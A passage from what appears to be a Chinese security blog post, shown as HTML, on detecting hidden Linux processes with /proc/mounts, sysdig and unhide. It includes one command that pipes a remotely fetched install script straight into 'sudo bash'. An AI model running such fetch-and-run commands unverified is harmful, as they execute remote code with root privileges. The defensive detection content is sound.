+<h2><span id="二-隐藏进程侦查">二、隐藏进程侦查</span></h2><h3><span id="21-方式一mounts">2.1 方式一（mounts）</span></h3><blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@docker]-[/proc]-<span class="comment">#cat /proc/mounts </span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/09/02/Process-Hide/1.png" alt="image"></p>
+</blockquote>
+<h3><span id="22-方式二sysdig">2.2 方式二（sysdig）</span></h3><blockquote>
+<p>下载安装：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -s https://s3.amazonaws.com/download.draios.com/stable/install-sysdig | sudo bash</span><br><span class="line"></span><br><span class="line">[root@docker]-[~]-<span class="comment">#sysdig -c topprocs_cpu</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2023/09/02/Process-Hide/2.png" alt="image"></p>
+</blockquote>
+<h3><span id="23-方式三unhide">2.3 方式三（unhide）</span></h3><blockquote>
+<p>下载安装：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install unhide</span><br></pre></td></tr></table></figure>
+
+<p>暴力扫描隐藏进程：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unhide checkbrute</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/09/02/Process-Hide/3.png" alt="image"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Process/" rel="tag">Process</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+</section>
+
+
+  <nav id="page-nav" class="clearfix">
+    
+    <a class="prev" rel="prev" href="/tags/Reprint/page/5/">
+      <span class="icon icon-chevron-left"></span>
+      <span class="text">Previous</span>
+    </a>
+    
+    
+    <a class="next" rel="next" href="/tags/Reprint/page/7/">
+      <span class="text">Next</span>
+      <span class="icon icon-chevron-right"></span>
+    </a>
+    
+  </nav>
+
+        <script>setLoadingBarProgress(60);</script>
+    </main>
+
+    <footer id="footer" class="clearfix">
+
+    
+
+    <div class="social-wrapper">
+        
+            
+                <a href="https://github.com/artchen" class="social github"
+                   target="_blank" rel="external">
+                    <span class="icon icon-github"></span>
+                </a>
+            
+                <a href="/atom.xml" class="social rss"
+                   target="_blank" rel="external">
+                    <span class="icon icon-rss"></span>
+                </a>
+            
+        
+    </div>
+
+    <div class="theme-by">Theme <span class="codename">Memory</span> designed by <a href="https://artifact.me/"
+                                                                                    target="_blank">Art Chen</a>.
+    </div>
+    <div>&copy; <a href="/">氕氘氚</a></div>
+
+</footer>
+
+
+    <script>setLoadingBarProgress(80);</script>
+    <div class="overlay"></div>
+</div>
+
+<div class="site-sidebar" id="site-sidebar">
+
+    
+
+    <div class="sidebar-switch clearfix "
+         style="display: none">
+        <a class="dark-btn active" data-toggle="toc">
+            <span class="icon icon-list"></span>
+            <span class="text">Index</span>
+        </a>
+        <a class="dark-btn" data-toggle="bio">
+            <span class="icon icon-person"></span>
+            <span class="text">Bio</span>
+        </a>
+    </div>
+
+    <div class="site-toc "
+         style="display: none">
+        
+            <div class="no-index">No Index</div>
+        
+    </div>
+
+    <div class="site-bio show"
+         style="display: block">
+
+        <div class="about-me clearfix">
+            <div class="avatar">
+                <img src="/img/avatar.png"/>
+            </div>
+            <div class="info">
+                <a class="name dark-btn" href="/about">
+                    Szczecin
+                </a>
+            </div>
+            <div class="info">
+                <span class="item desc">
+                    Open your eyes to see the light in life
+                </span>
+            </div>
+        </div>
+
+        <div class="menu section">
+            <ul class="clearfix">
+                
+                    <li class="left">
+                        <a href="/about"
+                           onfocus="this.blur();"
+                           class="nav-about dark-btn block">
+                            简介
+                        </a>
+                    </li>
+                
+                    <li class="right">
+                        <a href="/archives"
+                           onfocus="this.blur();"
+                           class="nav-archives dark-btn block">
+                            归档
+                        </a>
+                    </li>
+                
+                    <li class="left">
+                        <a href="/categories"
+                           onfocus="this.blur();"
+                           class="nav-categories dark-btn block">
+                            分类
+                        </a>
+                    </li>
+                
+                    <li class="right">
+                        <a href="/tags"
+                           onfocus="this.blur();"
+                           class="nav-tags dark-btn block">
+                            TAGs
+                        </a>
+                    </li>
+                
+                    <li class="left">
+                        <a href="/WriteUP"
+                           onfocus="this.blur();"
+                           class="nav-WriteUP dark-btn block">
+                            WriteUP
+                        </a>
+                    </li>
+                
+                    <li class="right">
+                        <a href="/EXP"
+                           onfocus="this.blur();"
+                           class="nav-EXP dark-btn block">
+                            EXP
+                        </a>
+                    </li>
+                
+                    <li class="left">
+                        <a href="/SRC"
+                           onfocus="this.blur();"
+                           class="nav-SRC dark-btn block">
+                            SRC
+                        </a>
+                    </li>
+                
+                    <li class="right">
+                        <a href="/Life"
+                           onfocus="this.blur();"
+                           class="nav-Life dark-btn block">
+                            Life
+                        </a>
+                    </li>
+                
+            </ul>
+        </div>
+
+    </div>
+
+    <div class="shortcuts">
+        <a href="#header" class="top window-nav dark-btn" id="go-top">
+            <span class="icon icon-chevron-thin-up"></span>
+        </a>
+        <a class="close dark-btn" id="sidebar-close">
+            <span class="icon icon-close"></span>
+        </a>
+        <a href="#footer" class="top window-nav dark-btn" id="go-bottom">
+            <span class="icon icon-chevron-thin-down"></span>
+        </a>
+    </div>
+
+</div>
+
+
+
+
+
+<script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+<script>window.jQuery || document.write('<script src="/js/jquery.min.js"><\/script>')</script>
+
+
+<script src="/js/jquery.fitvids.js"></script>
+
+<script>
+  var GOOGLE_CUSTOM_SEARCH_API_KEY = "";
+  var GOOGLE_CUSTOM_SEARCH_ENGINE_ID = "";
+  var ALGOLIA_API_KEY = "";
+  var ALGOLIA_APP_ID = "";
+  var ALGOLIA_INDEX_NAME = "";
+  var AZURE_SERVICE_NAME = "";
+  var AZURE_INDEX_NAME = "";
+  var AZURE_QUERY_KEY = "";
+  var SEARCH_SERVICE = "";
+  var universalSearchConfig = {};
+  if (SEARCH_SERVICE === 'google') {
+    universalSearchConfig = {
+      searchService: SEARCH_SERVICE,
+      apiKey: GOOGLE_CUSTOM_SEARCH_API_KEY,
+      engineId: GOOGLE_CUSTOM_SEARCH_ENGINE_ID,
+      imagePath: "/img/"
+    };
+  } else if (SEARCH_SERVICE === 'algolia') {
+    universalSearchConfig = {
+      searchService: SEARCH_SERVICE,
+      apiKey: ALGOLIA_API_KEY,
+      appId: ALGOLIA_APP_ID,
+      indexName: ALGOLIA_INDEX_NAME,
+      imagePath: "/img/"
+    };
+  } else if (SEARCH_SERVICE === 'azure') {
+    universalSearchConfig = {
+      searchService: SEARCH_SERVICE,
+      serviceName: AZURE_SERVICE_NAME,
+      indexName: AZURE_INDEX_NAME,
+      apiKey: AZURE_QUERY_KEY,
+      imagePath: "/img/"
+    };
+  }
+</script>
+
+<script src="/js/app.js"></script>
+
+
+<script src="/js/search.js"></script>
+
+
+
+
+
+<script>setLoadingBarProgress(100);</script>
+
+</body>
+</html>
